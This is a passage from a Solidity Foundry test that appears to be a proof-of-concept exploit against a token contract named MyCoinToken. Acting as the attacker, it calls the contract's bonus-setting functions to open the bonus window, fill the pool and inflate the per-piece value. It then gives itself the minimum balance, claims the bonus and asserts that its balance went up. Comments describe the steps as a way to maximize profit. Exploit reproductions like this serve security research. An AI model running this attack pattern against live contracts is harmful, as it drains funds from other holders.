        MyCoinToken(TARGET).setBounsTime(block.timestamp - 1);

        // Transfer contract balance to bonus pool
        MyCoinToken(TARGET).sumTheBounsPool(yesToday, twoYesToday);

        // Set inflated piece value - use a large number to maximize profit
        // The piece value determines how much bonus each piece gets
        MyCoinToken(TARGET).sumBounsPiece(yesToday, 1000000); // 1 million pieces

        vm.stopPrank();

        // Now we need to ensure we're eligible to claim bonus
        // Requirements:
        // 1. balanceOf(sender) >= minBounsJoin (100000000000 * 10^9)
        // 2. No sell records for today or yesterday
        // 3. Haven't received bonus today

        // Use deal() to give attacker enough tokens to meet minBounsJoin
        uint256 minBounsJoin = 100000000000 * 10 ** 9;
        deal(TARGET, attacker, minBounsJoin * 2); // Give double the minimum

        // Record attacker balance before claiming
        uint256 attackerBalanceBefore = MyCoinToken(TARGET).balanceOf(attacker);

        // Claim the bonus
        MyCoinToken(TARGET).receiveBounsToken();

        // Check balance increased
        uint256 attackerBalanceAfter = MyCoinToken(TARGET).balanceOf(attacker);
        assertGt(attackerBalanceAfter, attackerBalanceBefore, "Attacker balance should increase");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

